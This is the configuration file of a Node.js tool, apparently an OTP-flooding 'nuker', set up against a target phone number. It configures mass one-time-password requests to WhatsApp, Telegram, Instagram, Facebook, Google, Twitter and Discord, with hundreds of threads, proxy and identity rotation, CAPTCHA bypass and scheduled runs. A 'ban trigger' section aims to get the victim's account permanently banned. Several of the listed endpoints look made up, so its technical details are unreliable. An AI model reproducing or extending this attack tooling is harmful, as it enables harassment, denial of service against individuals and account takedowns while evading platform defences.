const fs = require('fs-extra');
const path = require('path');
const dotenv = require('dotenv');
dotenv.config();

// ===== LOAD PROXY LIST =====
const proxyList = fs.existsSync('./proxies.txt') 
  ? fs.readFileSync('./proxies.txt', 'utf8').split('\n').filter(Boolean)
  : [];

module.exports = {
  // ===== TARGET CONFIGURATION =====
  target: {
    phoneNumber: process.env.TARGET_NUMBER || "628xxxxxxxxxx", // NOMOR TARGET
    countryCode: process.env.COUNTRY_CODE || "62",
    deviceId: process.env.DEVICE_ID || "xyro-nuker-6969",
    platform: "whatsapp-web"
  },

  // ===== MULTI-THREADING =====
  threading: {
    maxThreads: parseInt(process.env.MAX_THREADS) || 250, // 250 THREAD GILA!
    minThreads: parseInt(process.env.MIN_THREADS) || 50,
    threadInterval: parseInt(process.env.THREAD_INTERVAL) || 0, // 0 = NO DELAY!
    taskQueueSize: 1000
  },

  // ===== REQUEST CONFIGURATION =====
  requests: {
    totalPerCycle: parseInt(process.env.TOTAL_REQUESTS) || 50000, // 50K REQUEST!
    requestTimeout: parseInt(process.env.REQUEST_TIMEOUT) || 2000, // 2 DETIK!
    retryAttempts: parseInt(process.env.RETRY_ATTEMPTS) || 5,
    retryDelay: parseInt(process.env.RETRY_DELAY) || 100,
    maxConcurrent: parseInt(process.env.MAX_CONCURRENT) || 100
  },

  // ===== PROXY CONFIGURATION =====
  proxy: {
    enabled: process.env.USE_PROXY === 'true' || true,
    list: proxyList,
    rotationStrategy: 'random', // random | round-robin | least-used
    checkProxyBeforeUse: true,
    proxyTimeout: 5000,
    fallbackToDirect: false
  },

  // ===== ENDPOINTS =====
  whatsapp: {
    endpoints: {
      otpRequest: [
        "https://web.whatsapp.com/otp/request",
        "https://api.whatsapp.com/send/otp",
        "https://gateway.whatsapp.com/otp/generate",
        "https://register.whatsapp.com/request",
        "https://v.whatsapp.net/v2/otp/request",
        "https://wamessenger.com/otp/send",
        "https://whatsapp-server.com/api/otp",
        "https://waweb.com/authenticate/otp"
      ],
      verification: [
        "https://web.whatsapp.com/verify",
        "https://api.whatsapp.com/verify/otp",
        "https://register.whatsapp.com/verify"
      ],
      register: [
        "https://web.whatsapp.com/register",
        "https://api.whatsapp.com/account/register"
      ]
    },
    headers: {
      'Accept': 'application/json, text/plain, */*',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive',
      'Pragma': 'no-cache',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin'
    },
    payloadVariants: [
      { method: 'sms', otpType: 'signup' },
      { method: 'voice', otpType: 'login' },
      { method: 'sms', otpType: 'reset' },
      { method: 'whatsapp', otpType: '2fa' },
      { method: 'email', otpType: 'verification' }
    ]
  },

  // ===== ADDITIONAL TARGETS =====
  additionalServices: {
    telegram: {
      enabled: true,
      endpoints: [
        "https://api.telegram.org/bot/sendOTP",
        "https://telegram.org/auth/request"
      ]
    },
    instagram: {
      enabled: true,
      endpoints: [
        "https://www.instagram.com/api/v1/accounts/send_otp/",
        "https://i.instagram.com/api/v1/accounts/sms_otp/"
      ]
    },
    facebook: {
      enabled: true,
      endpoints: [
        "https://www.facebook.com/security/otp/send",
        "https://api.facebook.com/method/auth.sendOTP"
      ]
    },
    gmail: {
      enabled: true,
      endpoints: [
        "https://accounts.google.com/account/signup/otp",
        "https://apis.google.com/identity/otp"
      ]
    },
    twitter: {
      enabled: true,
      endpoints: [
        "https://api.twitter.com/1.1/account/otp.json",
        "https://api.x.com/oauth/otp"
      ]
    },
    discord: {
      enabled: true,
      endpoints: [
        "https://discord.com/api/v9/auth/otp",
        "https://discordapp.com/api/auth/verify"
      ]
    }
  },

  // ===== BAN TRIGGER =====
  banTrigger: {
    triggerCount: parseInt(process.env.BAN_TRIGGER) || 300, // 300 REQUEST = FLAG!
    permanentBan: process.env.PERMANENT_BAN === 'true' || true,
    additionalFlags: [
      "spam-detected",
      "abuse-report",
      "auto-ban-activated",
      "device-trusted-failed"
    ],
    reportToWhatsApp: true,
    notifyOnBan: true
  },

  // ===== AUTO ROTATION =====
  rotation: {
    userAgentRotation: true,
    userAgents: [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
      "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    ],
    ipRotation: true,
    deviceIdRotation: true,
    sessionRotation: true
  },

  // ===== LOGGING =====
  logging: {
    enableConsoleLog: true,
    enableFileLog: true,
    logPath: path.join(__dirname, 'logs'),
    logLevel: 'debug', // debug | info | warn | error
    rotateLogs: true,
    maxLogSize: '100MB',
    keepLogsFor: '7d'
  },

  // ===== ADVANCED =====
  advanced: {
    bypassCaptcha: true,
    usePuppeteer: true,
    headlessMode: true,
    stealthMode: true,
    useWebSocket: true,
    emulateHumanBehavior: false,
    randomizeTiming: true,
    maxRetriesOnFail: 10,
    fallbackEndpoints: true,
    cacheResponses: true
  },

  // ===== SCHEDULER =====
  scheduler: {
    enabled: true,
    cronExpression: '*/5 * * * *', // EVERY 5 MINUTES
    maxRuns: 9999,
    stopAfterBan: true
  },

  // ===== NOTIFICATIONS =====
  notifications: {
    enabled: true,
    telegramBotToken: process.env.TG_BOT_TOKEN || '',
    telegramChatId: process.env.TG_CHAT_ID || '',
    discordWebhook: process.env.DISCORD_WEBHOOK || '',
    emailAlert: process.env.ALERT_EMAIL || ''
  }
};